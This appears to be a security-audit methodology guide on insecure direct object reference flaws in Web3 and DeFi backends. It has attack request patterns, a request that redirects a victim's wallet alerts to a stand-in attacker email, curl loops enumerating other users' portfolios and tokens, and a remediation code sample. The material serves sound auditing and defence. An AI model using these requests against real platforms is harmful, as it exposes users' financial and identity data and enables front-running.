# Web3 and DeFi-Specific IDOR Surfaces

## Attack Description
Web3 frontends, DeFi dashboards, NFT marketplaces, and bridge UIs often expose IDOR vulnerabilities due to the unique nature of blockchain applications. While on-chain data is public, off-chain infrastructure (APIs, databases, admin panels) frequently lacks proper authorization. This methodology covers Web3-specific IDOR attack surfaces.

## Web3 IDOR Attack Surfaces

### 1. Portfolio/Dashboard APIs
```http
# User portfolio data APIs
GET /api/portfolio?wallet=0xVictimAddress
GET /api/positions?user_id=12345
GET /api/analytics/user/victim_wallet_id

# These often return:
# - Transaction history
# - DeFi positions
# - Wallet labels/nicknames
# - Email/notification preferences
```

### 2. NFT Marketplace Backend
```http
# Hidden NFT metadata
GET /api/nft/12345/private-metadata
GET /api/collections/owner/victim_id/drafts

# Offer/bid information
GET /api/offers?to_user=victim_wallet
GET /api/bids/private/nft_id

# IDOR can expose:
# - Unlisted NFTs
# - Draft collections
# - Private offers
# - Wallet-linked email addresses
```

### 3. Bridge UI Infrastructure
```http
# Bridge transaction tracking
GET /api/bridge/transactions?user_wallet=victim_address

# Pending transfer details
GET /api/bridge/pending/tx_id

# Multi-sig admin panels
GET /api/bridge/admin/signers/victim_signer_id

# Risk: Exposes pending high-value transfers
```

### 4. Wallet Notification Services
```http
# Wallet alert settings
GET /api/alerts?wallet=victim_address
PUT /api/alerts/wallet_id
{"email": "attacker@evil.com", "threshold": 0.001}

# Push notification endpoints
GET /api/push/settings/victim_device_id

# Impact: Redirect alerts to attacker → front-run transactions
```

### 5. DAO/Governance Backends
```http
# Private proposal drafts
GET /api/dao/proposals/draft/proposal_id

# Voting power calculations (off-chain)
GET /api/governance/voting-power/victim_wallet

# Delegate relationships
GET /api/delegates/info/delegate_id

# Admin panels
POST /api/admin/proposals/execute
{"proposal_id": "any_id"}  # IDOR in admin context
```

### 6. DeFi Protocol Dashboards
```http
# Liquidation risk data
GET /api/protocol/positions/victim_wallet/health

# Yield optimization strategies (private)
GET /api/strategies/user/victim_id

# Referral/points systems
GET /api/points?user=victim_wallet
PUT /api/referral/code/any_code
```

### 7. Token Launchpad Platforms
```http
# Private sale allocations
GET /api/launchpad/allocations/victim_wallet

# KYC verification status
GET /api/kyc/status/user_id

# Vesting schedules
GET /api/vesting/schedule/victim_wallet
```

## Exploitation Patterns

### Pattern 1: Wallet Address as Object Reference
```http
# Most common Web3 IDOR pattern
# Wallet addresses are public, but backend data isn't

GET /api/user/0x742d35Cc6634C0532925a3b844Bc9e7595f...]

# Test with any known wallet address:
# - Vitalik: 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045
# - Project treasuries
# - Whale wallets from Etherscan
```

### Pattern 2: Internal User ID Mapping
```http
# Backend maps wallet → internal user_id
# Find mapping in API responses:

POST /api/login
{"wallet": "0xAttacker..."}

Response:
{"token": "...", "user_id": "12345"}

# Now enumerate:
GET /api/user/12344/data  # Victim's data
```

### Pattern 3: Transaction Hash Reference
```http
# Private transaction metadata via tx hash
GET /api/tx/0xabc.../private-notes
GET /api/tx/0xabc.../attachments

# Tx hashes are public, attached data might not be
```

### Pattern 4: NFT Token ID Enumeration
```http
# Sequential NFT IDs often reveal unreleased items
GET /api/nft/999  # Released
GET /api/nft/1000 # Unreleased (IDOR to preview)
GET /api/nft/1001 # Future drop details
```

### Pattern 5: API Key in Off-Chain Services
```http
# Many DeFi apps use off-chain API keys
GET /api/premium/features
X-API-Key: leaked_key_from_js

# Or user API keys stored in database
GET /api/keys?user_id=victim_id
```

## Web3-Specific Impact

### Financial Impact
- Front-running: Attacker sees pending large trades → front-runs on-chain
- Liquidation sniping: See undercollateralized positions → trigger liquidation
- Allocation theft: Modify launchpad allocations → steal token allocation

### Privacy Impact
- Wallet deanonymization: Link wallets to emails/identities
- Strategy exposure: Reveal trading strategies, yield farming routes
- KYC data leak: Access identity documents via IDOR

### Governance Impact  
- Vote manipulation: Modify voting delegation
- Proposal preview: See draft proposals before public
- Sybil detection: Reveal linked wallets

## Zealynx Web3 IDOR Checklist

### Frontend/API Testing
- [ ] Map all API endpoints in DeFi frontend (check Network tab)
- [ ] Identify wallet address parameters — test with other wallets
- [ ] Check internal user_id mapping — enumerate sequentially
- [ ] Test NFT metadata endpoints with incremental token IDs
- [ ] Look for admin/internal endpoints in JS bundles

### Bridge UI Specific
- [ ] Test transaction tracking with other users' tx hashes
- [ ] Check pending transfer visibility
- [ ] Verify multi-sig signer information access
- [ ] Test relayer status endpoints

### NFT Marketplace Specific
- [ ] Draft/unlisted collection access
- [ ] Private offer visibility
- [ ] Unrevealed NFT metadata access
- [ ] Creator dashboard IDOR

### DAO/Governance Specific
- [ ] Draft proposal access
- [ ] Voting power calculation manipulation
- [ ] Delegate information exposure
- [ ] Treasury management IDOR

### DeFi Protocol Specific
- [ ] Position/health factor visibility
- [ ] Strategy exposure via API
- [ ] Points/referral manipulation
- [ ] Yield calculation IDOR

## Detection Method

1. **Wallet Address Testing**
   ```bash
   # Test with whale wallets
   for wallet in "vitalik.eth" "0x742d..." "0xabc..."; do
     curl "https://defi.app/api/user/$wallet/portfolio" \
       -H "Authorization: Bearer $ATTACKER_TOKEN"
   done
   ```

2. **Transaction Hash Testing**
   ```bash
   # Get random tx hashes from Etherscan
   # Test for private data attached to public tx
   curl "https://defi.app/api/tx/$TX_HASH/notes"
   ```

3. **Sequential ID Testing**
   ```bash
   # NFT, proposal, allocation IDs
   for id in {1..1000}; do
     curl "https://nft.app/api/token/$id/metadata"
   done
   ```

## Remediation

```python
# VULNERABLE - Trusts wallet address from request
@app.route('/api/portfolio/<wallet>')
def get_portfolio(wallet):
    return db.query("SELECT * FROM portfolios WHERE wallet = ?", wallet)

# SECURE - Verify authenticated wallet matches requested wallet
@app.route('/api/portfolio/<wallet>')
def get_portfolio(wallet):
    if wallet.lower() != current_user.wallet.lower():
        # Allow if portfolio is public
        portfolio = db.query("SELECT * FROM portfolios WHERE wallet = ?", wallet)
        if not portfolio.is_public:
            return {"error": "Unauthorized"}, 403
    return get_portfolio_data(wallet)
```

## Real Examples

### DeFi Dashboard IDOR
Portfolio API exposed any wallet's DeFi positions, including unrevealed strategies.
- Impact: Whale strategy copying, MEV front-running

### NFT Marketplace Draft Leak
Collection draft endpoint allowed previewing unreleased drops.
- Impact: Insider trading on upcoming drops

### Bridge Transaction Leak
Pending bridge transactions exposed via IDOR, including amounts and destinations.
- Impact: Front-running large bridge transfers

### DAO Proposal Preview
Draft governance proposals visible before official publication.
- Impact: Insider trading on governance decisions

## Key Insight for Zealynx Audits
**Web3 frontends are a goldmine for IDOR vulnerabilities.**
The blockchain is transparent, but teams forget their off-chain infrastructure isn't.
Always test: portfolio APIs, notification systems, admin panels, and internal dashboards.
